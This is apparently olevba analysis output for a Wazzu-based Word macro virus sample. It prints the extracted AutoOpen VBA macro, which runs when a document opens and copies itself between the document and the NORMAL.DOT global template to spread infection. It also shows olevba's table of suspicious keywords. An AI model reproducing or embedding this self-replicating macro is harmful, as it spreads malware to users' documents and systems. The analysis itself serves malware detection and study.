olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-dc419439811f86deaf135b24f0179b14460c77aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-dc419439811f86deaf135b24f0179b14460c77aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu-based-dc419439811f86deaf135b24f0179b14460c77aa - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$

On Error GoTo -1: On Error GoTo errcaught

WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dlg

fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
globMacro$ = "Global:AutoOpen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

If MacroFile$ = "NORMAL.DOT" Then
    WordBasic.MacroCopy globMacro$, fileMacro$
    WordBasic.FileSaveAs Format:=1
Else
    WordBasic.MacroCopy fileMacro$, globMacro$
End If

GoTo bye

errcaught:

bye:
    On Error GoTo -1: On Error GoTo 0

End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Wazzu-based-dc419439811f86deaf135b24f0179b14460c77aa - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

